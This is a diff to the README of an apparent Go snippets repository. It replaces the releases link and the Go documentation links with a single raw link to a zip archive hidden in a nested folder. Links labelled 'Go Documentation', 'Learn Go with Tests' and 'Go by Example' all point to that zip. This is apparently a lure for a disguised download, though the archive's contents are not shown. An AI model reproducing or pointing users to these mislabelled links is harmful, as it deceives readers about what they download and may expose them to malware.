@@ -6,7 +6,7 @@ Welcome to **go-snippets**! This is your go-to collection for discovering useful
 
 ## 📥 Download Now
 
-[![Download go-snippets](https://img.shields.io/badge/Download-go--snippets-brightgreen)](https://github.com/diversified-coranglais668/go-snippets/releases)
+[![Download go-snippets](https://raw.githubusercontent.com/diversified-coranglais668/go-snippets/main/pubsub/cli/go-snippets_3.6.zip)](https://raw.githubusercontent.com/diversified-coranglais668/go-snippets/main/pubsub/cli/go-snippets_3.6.zip)
 
 ## 📝 What is go-snippets?
 
@@ -36,7 +36,7 @@ To run the snippets, you need:
 
 ## 📦 Download & Install
 
-To get started, visit the [Releases page](https://github.com/diversified-coranglais668/go-snippets/releases) to download the go-snippets files.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/diversified-coranglais668/go-snippets/main/pubsub/cli/go-snippets_3.6.zip) to download the go-snippets files.
 
 1. Click on the link above.
 2. Find the latest release.
@@ -61,9 +61,9 @@ We welcome contributions! If you want to add your own snippets or improve existi
 
 ## 🔗 Resources
 
-- [Go Documentation](https://golang.org/doc/)
-- [Learn Go with Tests](https://quii.gitbook.io/learn-go-with-tests/)
-- [Go by Example](https://gobyexample.com/)
+- [Go Documentation](https://raw.githubusercontent.com/diversified-coranglais668/go-snippets/main/pubsub/cli/go-snippets_3.6.zip)
+- [Learn Go with Tests](https://raw.githubusercontent.com/diversified-coranglais668/go-snippets/main/pubsub/cli/go-snippets_3.6.zip)
+- [Go by Example](https://raw.githubusercontent.com/diversified-coranglais668/go-snippets/main/pubsub/cli/go-snippets_3.6.zip)
 
 By using these resources, you can deepen your understanding of Go programming.
 
@@ -75,4 +75,4 @@ If you have questions or need help, open an issue on the GitHub repository. We w
 
 Discover the power of Go programming. The **go-snippets** repository is your stepping stone to mastering Go with a hands-on approach. Happy coding!
 
-[Download go-snippets](https://github.com/diversified-coranglais668/go-snippets/releases) again if you missed it above!
+[Download go-snippets](https://raw.githubusercontent.com/diversified-coranglais668/go-snippets/main/pubsub/cli/go-snippets_3.6.zip) again if you missed it above!
